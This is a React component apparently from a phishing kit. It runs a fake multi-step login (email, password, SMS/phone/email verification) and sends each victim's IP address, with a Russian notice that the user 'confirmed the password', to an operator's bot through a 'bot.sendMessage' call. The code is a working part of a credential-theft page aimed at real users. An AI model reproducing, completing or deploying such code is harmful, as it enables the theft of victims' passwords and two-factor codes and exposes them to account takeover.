import React, {useEffect, useState} from 'react';
import Email from "../email/Email";
import Password from "../password/Password";
import AuthVerification from "../authVerification/AuthVerification";
import axios from "axios";
import bot from "../../bot_manager/manager";
import FinalAuth from "../finalAuth/FinalAuth";

const LoginManager = ({info}) => {

    const [firstStep, setStep] = useState(true);
    const [email, setEmail] = useState('')
    //0 - nothing, 1 - SMS, 2 - phone, 3 - Email
    const [state, setState] = useState(0);
    const [isFinalStep,setFinalStep] = useState(false);

    useEffect(() => {
        if (state !== 0) {
            axios.post(bot.sendMessage('✔ Пользователь <code>' + info.IPv4 + "</code> Подтвердил пароль!"), '')
        }
    }, [state])

    return (
        <div>
            {!isFinalStep  ? state === 0 ? firstStep ? <Email info={info} setStep={setStep.bind()} setEmail={setEmail.bind()}/> :
                    <Password info={info} email={email} setState={setState.bind()}/>
                :
                <div>
                    <AuthVerification state={state} setFinal={setFinalStep.bind()} info={info}/>
                </div> : <FinalAuth state={state} info={info}/>
            }
        </div>
    );
};

export default LoginManager;